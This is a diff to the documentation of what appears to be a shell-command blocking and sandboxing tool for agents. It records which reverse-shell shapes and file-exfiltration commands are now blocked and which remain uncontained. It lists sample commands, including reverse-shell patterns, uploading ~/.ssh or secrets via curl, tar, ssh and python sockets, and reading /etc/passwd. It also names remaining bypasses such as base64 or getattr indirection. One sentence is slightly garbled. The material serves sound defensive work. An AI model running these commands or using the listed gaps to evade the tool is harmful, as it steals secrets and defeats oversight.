@@ -17,8 +17,11 @@ description: >-
   (DF-16 fixed: raw-socket file payloads block with builtin-net-file-exfil-*,
   and an approved `allow-cat-safe` no longer covers a net-client pipe source;
   DF-11 fixed: the auto-sandbox `modify` preflight now probes the rewrite's own
-  prefix, so rewrites run on DEGRADED hosts).
-version: 1.5.0
+  prefix, so rewrites run on DEGRADED hosts; DF-17 closed: `curl -F/--form`
+  local-file uploads are sandboxed and interpreter socket/file egress
+  (`python3 -c` socket+dup2/pty, socket send of a local file, urllib/requests
+  file bodies, `sh -c`/`bash -c` wrappers) blocks with builtin-interp-egress-*).
+version: 1.6.0
 category: software-development
 ---
 
@@ -212,22 +215,35 @@ $TJ --user touch /tmp/x   # → COMMAND BLOCKED, rc=126
   blocklist rules, matched in the whole-command pass before the allowlist can
   short-circuit. Still treat `allow-cat-safe` as "safe to read", never as "safe to
   wire into anything": the rules are shape-based, and the sinks they do not cover
-  (ssh/scp/rsync/git push, `echo … | nc`, interpreter sockets) stay uncontained —
+  (ssh/scp/rsync/git push, `echo … | nc`, interpreter APIs outside the DF-17
+  primitives) stay uncontained —
   see the Data-Out Boundary section in README.md / `specs/interruptor.md` §4.6.
-- **The egress pack is narrow (DF-TERMINAL-JAIL-17, partly closed)**: it blocks the
-  reverse-shell shapes (all 11 verified live: `/dev/tcp|/dev/udp` redirects, `nc -e`/`ncat --exec`/`-c`,
+- **The egress pack is narrow — read the boundary, not the rule count
+  (DF-TERMINAL-JAIL-17, closed 2026-09-19)**: it blocks the reverse-shell shapes
+  (all 11 verified live: `/dev/tcp|/dev/udp` redirects, `nc -e`/`ncat --exec`/`-c`,
   shell-pipe netcat, the `mkfifo` loop, `socat … EXEC:`, `openssl s_client | sh`,
-  `eval`-wrapped variants), it blocks raw-socket file payloads (DF-TERMINAL-JAIL-16:
-  reader-piped-to-`nc`/`socat`, `nc host port < file`), and it sandboxes
-  `-T/--upload-file` + `-d/--data*` + `@-`
-  uploads — but `curl -F 'file=@secret' https://…` is a plain ALLOW, as are
-  `tar czf - ~/.ssh | ssh host` (a non-raw-socket sink) and
-  `python3 -c` socket/`urllib`/`requests` egress. `python3 -c` / `sh -c` are also
-  outside the auto-sandbox set while `python3 file.py` is inside. And a
+  `eval`-wrapped variants), raw-socket file payloads (DF-TERMINAL-JAIL-16:
+  reader-piped-to-`nc`/`socat`, `nc host port < file`), and — since DF-17 —
+  interpreter socket/file egress: `python3 -c` socket + `os.dup2(`/`pty.spawn(`
+  → `builtin-interp-egress-socket-shell`, socket `send`/`sendall`/`sendfile` of a
+  read-mode local file → `-socket-file`, and `urlopen`/`requests.post|put|patch`/
+  `httpx`/`http.client` with a file body → `-http-file`. A `sh -c` / `bash -c`
+  wrapper does NOT change those verdicts (blocklist rules match the whole command
+  string), but `python3 -c` / `sh -c` themselves are still outside the
+  auto-sandbox set while `python3 file.py` is inside — that asymmetry is
+  deliberate and documented, not a bug. The sandbox tier now also covers
+  `curl -F/--form` fields carrying a local file (`name=@file`, `name=<file`),
+  while inline fields and `--form-string` stay ALLOW. Still uncontained, and
+  named as such: `tar czf - ~/.ssh | ssh host` (non-raw-socket sink),
+  `git push`, Perl/Ruby/Node sockets, API names behind an indirection
+  (`getattr`/`importlib`/base64-decoded source), in-memory payloads, and query
+  a `grep`-style read of source that merely MENTIONS a socket API (both halves of
+  a transfer must be present, which is why those controls stay allowed). And a
   `modify` verdict does NOT prevent the transfer (DF-TERMINAL-JAIL-20): measured
   with a real collector, `curl -T <secret> http://127.0.0.1:18777/collect` was
   rewritten to the sandboxed form, exited 0, and the secret arrived (132 bytes).
   Auto-sandbox = containment of the filesystem view; only a `block` stops egress.
+  Full boundary: README.md "Data-Out Boundary" / `specs/interruptor.md` §4.6.
 - **`allow-cat-safe` does not actually exclude /etc|/boot|/proc|/sys**
   (DF-TERMINAL-JAIL-13): its negative lookahead can never match those
   paths, so `cat /etc/passwd` is allowed by the default-allow posture, not
